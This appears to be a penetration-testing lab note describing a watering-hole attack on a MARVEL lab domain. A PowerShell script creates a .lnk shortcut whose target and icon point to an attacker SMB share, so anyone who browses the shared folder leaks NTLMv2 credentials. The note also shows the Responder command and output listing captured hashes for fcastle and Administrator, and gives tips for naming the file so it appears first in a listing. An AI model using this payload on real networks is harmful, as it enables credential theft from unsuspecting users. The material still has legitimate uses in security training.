
This is a [[Watering Hole Attack|Watering Hole]] type of attack where we craft a malicious file that will connect to our machine when loaded by the file browser. If we have *responder* up, it will *capture the hashes* included in the request.

The first step it to generate the file using PowerShell.

```PowerShell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.23.133\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

We need to run the above commands in a powershell that was opened as an administrator. Or else we get the following error when we try to save the file.

```PowerShell
PS C:\Users\fcastle>  $lnk.Save()
Unable to save shortcut "C:\test.lnk".
At line:1 char:1 
+ $lnk.Save()
+ ~~~~~~~~~~~ 
	+ CategoryInfo          : OperationStopped: (:) [], UnauthorizedAccessException
	+ FullyQualifiedErrorId : System.UnauthorizedAccessException
```

When we save the file, it will be saved at `C:\` by default. We can copy the file and save it in a shared network drive to make it a watering hole attack. Since we *only need this file to be loaded* for the attack to work, we can add a symbol like `@` or `~` to bring to the top of the list of files.

We need to have `responder` up and running to capture the incoming hashes, and **make sure `SMB` is turned on** in responder. If it is not, we can edit the settings at `/etc/responder/Responder.conf` to enable `SMB`.

When a user opens the file share our file is located at, we get the following output from `responsder`. We add the `-v` flag to display hashes ignoring whether they have been captured before. 

```bash
$ sudo responder -I eth0 -dPv

.
.
.

[+] Listening for events...                                         

[*] [DHCP] Found DHCP server IP: 192.168.23.254, now waiting for incoming requests...
[SMB] NTLMv2-SSP Client   : 192.168.23.131
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:7352a1a0487ea608:A023B95E51A62BE2B5226E134D3FBF0D:0101000000000000009B81F8139FDB0154FC0DF52DC7B6390000000002000800450034004E00470001001E00570049004E002D005400590051004A005A0031003600480059005800530004003400570049004E002D005400590051004A005A003100360048005900580053002E00450034004E0047002E004C004F00430041004C0003001400450034004E0047002E004C004F00430041004C0005001400450034004E0047002E004C004F00430041004C0007000800009B81F8139FDB01060004000200000008003000300000000000000001000000002000001453FF35A0319CEDCCF77EF4FC510CA938C1E805D2DFBB0D3A2534439F9463F60A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00320033002E003100330033000000000000000000 
[SMB] NTLMv2-SSP Client   : 192.168.23.130
[SMB] NTLMv2-SSP Username : MARVEL\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::MARVEL:9e7f135e8c485700:7D9C0B93FD851D6D01E72587AE2C04D0:01010000000000008039F659159FDB014EC01658E38078420000000002000800480034005000440001001E00570049004E002D00420053004E00460043004500510041004B004D004E0004003400570049004E002D00420053004E00460043004500510041004B004D004E002E0048003400500044002E004C004F00430041004C000300140048003400500044002E004C004F00430041004C000500140048003400500044002E004C004F00430041004C00070008008039F659159FDB0106000400020000000800300030000000000000000000000000300000ADCB4C779BADD4F89FFD0E62E664F5B538295ADD04A3B76BAFA72846E9784E6E0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00320033002E003100330033000000000000000000 
```

## netexec

